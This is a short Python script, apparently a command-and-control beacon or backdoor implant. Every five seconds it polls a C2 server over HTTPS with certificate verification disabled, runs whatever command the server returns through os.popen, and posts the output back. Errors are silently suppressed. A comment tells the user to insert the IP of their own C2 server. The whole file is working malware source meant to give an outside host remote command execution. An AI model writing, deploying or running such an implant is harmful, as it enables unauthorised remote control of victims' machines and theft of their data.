import os, ssl, time, http.client

def callback():
    try:
        # change 127.0.0.1 with IP of your c2 server
        c2_connection = http.client.HTTPSConnection('127.0.0.1', timeout=10, context=ssl._create_unverified_context())
        c2_connection.request("GET", "/")
        cmd = c2_connection.getresponse().read().decode()
        if cmd:
            results = (os.popen(str(cmd)).read())
            c2_connection.request("POST", "", results)
            c2_connection.close()
    except:
        pass

while 1:
    callback()
    time.sleep(5)

